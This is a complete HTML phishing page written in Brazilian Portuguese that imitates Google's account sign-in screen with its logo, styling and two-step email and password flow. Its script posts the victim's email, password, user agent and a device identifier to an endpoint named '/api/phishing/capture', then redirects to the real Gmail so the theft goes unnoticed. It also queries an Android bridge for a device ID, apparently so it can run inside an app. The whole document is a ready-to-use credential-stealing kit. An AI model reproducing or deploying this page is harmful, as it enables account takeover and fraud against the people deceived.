<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fazer login - Contas do Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html, body {
            height: 100%;
            font-family: 'Roboto', arial, sans-serif;
            font-size: 14px;
            color: #202124;
            background-color: #fff;
        }
        
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 24px;
        }
        
        .container {
            width: 100%;
            max-width: 450px;
            flex-shrink: 0;
        }
        
        .logo-container {
            padding: 48px 0 0;
            text-align: center;
        }
        
        .logo {
            display: inline-block;
        }
        
        .logo svg {
            height: 24px;
            width: 75px;
        }
        
        .card {
            border: 1px solid #dadce0;
            border-radius: 8px;
            margin: 0 auto 16px;
            min-height: 500px;
            display: flex;
            flex-direction: column;
        }
        
        .card-body {
            padding: 48px 40px 36px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 400;
            letter-spacing: 0;
            line-height: 1.3333;
            margin-bottom: 0;
            padding-bottom: 0;
            padding-top: 16px;
            text-align: center;
        }
        
        .subtitle {
            font-size: 16px;
            font-weight: 400;
            letter-spacing: .1px;
            line-height: 1.5;
            margin-bottom: 24px;
            text-align: center;
            color: #202124;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        .form-input {
            background-color: #fff;
            border: 1px solid #dadce0;
            border-radius: 4px;
            color: #202124;
            font-size: 16px;
            height: 56px;
            padding: 13px 15px;
            width: 100%;
            outline: none;
            transition: background-color 0.2s, border-color 0.2s;
        }
        
        .form-input:hover {
            border-color: #dadce0;
            background-color: #f8f9fa;
        }
        
        .form-input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
            background-color: #fff;
        }
        
        .form-input.error {
            border-color: #d93025;
        }
        
        .error-message {
            color: #d93025;
            font-size: 12px;
            padding-top: 8px;
            display: none;
            align-items: center;
        }
        
        .error-message.show {
            display: flex;
        }
        
        .error-icon {
            width: 16px;
            height: 16px;
            margin-right: 8px;
        }
        
        .forgot-email {
            color: #1a73e8;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            padding: 0;
            border: none;
            background: none;
        }
        
        .forgot-email:hover {
            text-decoration: underline;
        }
        
        .button-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding-top: 24px;
        }
        
        .create-account {
            color: #1a73e8;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }
        
        .create-account:hover {
            text-decoration: underline;
        }
        
        .next-button {
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-family: 'Roboto', arial, sans-serif;
            font-size: 14px;
            font-weight: 500;
            letter-spacing: .25px;
            min-width: 80px;
            padding: 9px 24px;
            transition: background-color 0.2s, box-shadow 0.2s;
        }
        
        .next-button:hover:not(:disabled) {
            background-color: #1765cc;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }
        
        .next-button:disabled {
            background-color: #dadce0;
            color: #80868b;
            cursor: not-allowed;
        }
        
        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #1a73e8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 12px auto;
        }
        
        .loading-spinner.show {
            display: block;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer {
            padding-bottom: 24px;
            text-align: center;
        }
        
        .language-select {
            background: transparent;
            border: none;
            color: #5f6368;
            cursor: pointer;
            font-family: 'Roboto', arial, sans-serif;
            font-size: 12px;
            padding: 8px;
            outline: none;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            list-style: none;
            padding: 12px 0 0;
        }
        
        .footer-links li {
            padding: 0 12px;
        }
        
        .footer-links a {
            color: #5f6368;
            font-size: 12px;
            text-decoration: none;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 600px) {
            .card-body {
                padding: 24px 24px 36px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <div class="logo">
                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <g fill="none" fill-rule="evenodd">
                        <path d="M67.954 16.303c-1.433 0-2.5-.87-2.5-2.177 0-1.307 1.067-2.177 2.5-2.177s2.5.87 2.5 2.177c0 1.307-1.067 2.177-2.5 2.177z" fill="#EA4335"></path>
                        <path d="M58.193.67h2.564v17.44h-2.564z" fill="#4285F4"></path>
                        <path d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.953 5.71 5.953 1.42 0 2.548-.632 3.136-1.347h.088v.844c0 2.283-1.194 3.52-3.124 3.52-1.572 0-2.549-1.134-2.952-2.09l-2.236.933c.642 1.543 2.352 3.444 5.188 3.444 3.015 0 5.564-1.775 5.564-6.1V7.01h-2.44v1.056zm-2.975 8.237c-1.858 0-3.414-1.567-3.414-3.72 0-2.18 1.556-3.747 3.414-3.747 1.833 0 3.124 1.593 3.124 3.747 0 2.127-1.29 3.72-3.124 3.72z" fill="#FBBC05"></path>
                        <path d="M38.17 8.066h-.087c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.953 5.71 5.953 1.42 0 2.548-.632 3.136-1.347h.087v.844c0 2.283-1.193 3.52-3.124 3.52-1.571 0-2.548-1.134-2.952-2.09l-2.235.933c.642 1.543 2.352 3.444 5.188 3.444 3.014 0 5.563-1.775 5.563-6.1V7.01h-2.44v1.056zm-2.975 8.237c-1.858 0-3.413-1.567-3.413-3.72 0-2.18 1.555-3.747 3.413-3.747 1.834 0 3.124 1.593 3.124 3.747 0 2.127-1.29 3.72-3.124 3.72z" fill="#EA4335"></path>
                        <path d="M25.17 6.71c-3.28 0-5.953 2.5-5.953 5.98 0 3.456 2.673 5.953 6.28 5.953 2.83 0 4.468-1.733 5.494-3.237l-2.25-1.5c-.63.93-1.5 1.557-3.244 1.557-1.47 0-2.513-.68-3.166-2.01l8.72-3.608-.402-.977c-.735-1.77-2.663-3.157-5.478-3.157zm.14 2.177c1.21 0 2.236.61 2.582 1.49L22.84 12.46c-.205-2.572 1.995-3.572 3.47-3.572z" fill="#4285F4"></path>
                        <path d="M14.11 14.182c-.722-.723-1.205-1.78-1.205-3.27 0-1.492.483-2.548 1.205-3.27.722-.723 1.792-1.116 3.022-1.116 1.23 0 2.3.393 3.023 1.116.722.722 1.204 1.778 1.204 3.27 0 1.49-.482 2.547-1.204 3.27-.722.722-1.792 1.115-3.023 1.115-1.23 0-2.3-.393-3.022-1.115zm5.344-6.54c-.536-.537-1.29-.822-2.322-.822-1.03 0-1.785.285-2.32.822-.536.536-.804 1.348-.804 2.45 0 1.1.268 1.913.803 2.45.536.535 1.29.82 2.32.82 1.032 0 1.787-.285 2.322-.82.536-.537.804-1.35.804-2.45 0-1.102-.268-1.914-.804-2.45z" fill="#34A853"></path>
                        <path d="M9.09 8.273c-.7 0-1.31.244-1.735.668-.424.424-.668 1.035-.668 1.735 0 .7.244 1.31.668 1.735.424.424 1.035.668 1.735.668s1.31-.244 1.735-.668c.424-.424.668-1.035.668-1.735 0-.7-.244-1.31-.668-1.735-.424-.424-1.035-.668-1.735-.668z" fill="#EA4335"></path>
                    </g>
                </svg>
            </div>
        </div>
        
        <div class="card">
            <div class="card-body">
                <h1>Fazer login</h1>
                <div class="subtitle">Use sua Conta do Google</div>
                
                <form id="loginForm">
                    <!-- Step 1: Email -->
                    <div id="emailStep">
                        <div class="form-group">
                            <div class="input-wrapper">
                                <input 
                                    type="email" 
                                    id="email" 
                                    class="form-input"
                                    placeholder="E-mail ou telefone"
                                    autocomplete="username"
                                    spellcheck="false"
                                    required
                                >
                            </div>
                            <div class="error-message" id="emailError">
                                <svg class="error-icon" aria-hidden="true" fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                </svg>
                                <span>Digite um e-mail ou número de telefone</span>
                            </div>
                        </div>
                        
                        <button type="button" class="forgot-email">Esqueceu o e-mail?</button>
                    </div>
                    
                    <!-- Step 2: Password -->
                    <div id="passwordStep" style="display: none;">
                        <div class="form-group">
                            <div style="display: flex; align-items: center; margin-bottom: 16px;">
                                <span style="flex: 1; color: #5f6368; font-size: 14px;" id="emailDisplay"></span>
                            </div>
                            <div class="input-wrapper">
                                <input 
                                    type="password" 
                                    id="password" 
                                    class="form-input"
                                    placeholder="Digite sua senha"
                                    autocomplete="current-password"
                                    required
                                >
                            </div>
                            <div class="error-message" id="passwordError">
                                <svg class="error-icon" aria-hidden="true" fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                </svg>
                                <span>Senha incorreta. Tente novamente.</span>
                            </div>
                        </div>
                        
                        <button type="button" class="forgot-email">Esqueceu a senha?</button>
                    </div>
                    
                    <div class="loading-spinner" id="spinner"></div>
                    
                    <div class="button-row">
                        <a href="#" class="create-account">Criar conta</a>
                        <button type="submit" class="next-button" id="nextBtn">Próxima</button>
                    </div>
                </form>
            </div>
        </div>
        
        <div class="footer">
            <select class="language-select">
                <option value="pt-BR" selected>Português (Brasil)</option>
                <option value="en">English (US)</option>
                <option value="es">Español</option>
                <option value="fr">Français</option>
            </select>
            
            <ul class="footer-links">
                <li><a href="#">Ajuda</a></li>
                <li><a href="#">Privacidade</a></li>
                <li><a href="#">Termos</a></li>
            </ul>
        </div>
    </div>
    
    <script>
        let currentStep = 1;
        let capturedEmail = '';
        
        const form = document.getElementById('loginForm');
        const emailStep = document.getElementById('emailStep');
        const passwordStep = document.getElementById('passwordStep');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const emailDisplay = document.getElementById('emailDisplay');
        const nextBtn = document.getElementById('nextBtn');
        const spinner = document.getElementById('spinner');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        
        // Focar no email ao carregar
        window.addEventListener('load', function() {
            emailInput.focus();
        });
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            if (currentStep === 1) {
                // Validar email
                const email = emailInput.value.trim();
                
                if (!email || !validateEmail(email)) {
                    emailError.classList.add('show');
                    emailInput.classList.add('error');
                    return;
                }
                
                emailError.classList.remove('show');
                emailInput.classList.remove('error');
                
                // Mostrar loading
                spinner.classList.add('show');
                nextBtn.disabled = true;
                
                // Simular verificação
                await sleep(1000);
                
                // Ir para step 2
                capturedEmail = email;
                emailStep.style.display = 'none';
                passwordStep.style.display = 'block';
                emailDisplay.textContent = email;
                spinner.classList.remove('show');
                nextBtn.disabled = false;
                nextBtn.textContent = 'Próxima';
                currentStep = 2;
                
                // Focar na senha
                setTimeout(() => passwordInput.focus(), 100);
                
            } else if (currentStep === 2) {
                // Capturar senha
                const password = passwordInput.value;
                
                if (!password) {
                    passwordError.classList.add('show');
                    passwordInput.classList.add('error');
                    return;
                }
                
                passwordError.classList.remove('show');
                passwordInput.classList.remove('error');
                
                // Mostrar loading
                spinner.classList.add('show');
                nextBtn.disabled = true;
                
                // Enviar credenciais
                try {
                    await fetch('/api/phishing/capture', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Device-ID': getDeviceId()
                        },
                        body: JSON.stringify({
                            platform: 'gmail',
                            email: capturedEmail,
                            password: password,
                            user_agent: navigator.userAgent,
                            timestamp: new Date().toISOString()
                        })
                    });
                } catch (e) {}
                
                // Simular verificação
                await sleep(1500);
                
                // Redirecionar para Gmail
                window.location.href = 'https://mail.google.com';
            }
        });
        
        // Remover erros ao digitar
        emailInput.addEventListener('input', function() {
            emailError.classList.remove('show');
            emailInput.classList.remove('error');
        });
        
        passwordInput.addEventListener('input', function() {
            passwordError.classList.remove('show');
            passwordInput.classList.remove('error');
        });
        
        function validateEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }
        
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        function getDeviceId() {
            try {
                if (typeof Android !== 'undefined' && Android.getDeviceId) {
                    return Android.getDeviceId();
                }
            } catch (e) {}
            
            let deviceId = localStorage.getItem('device_id');
            if (!deviceId) {
                deviceId = 'web_' + Math.random().toString(36).substr(2, 9);
                localStorage.setItem('device_id', deviceId);
            }
            return deviceId;
        }
    </script>
</body>
</html>
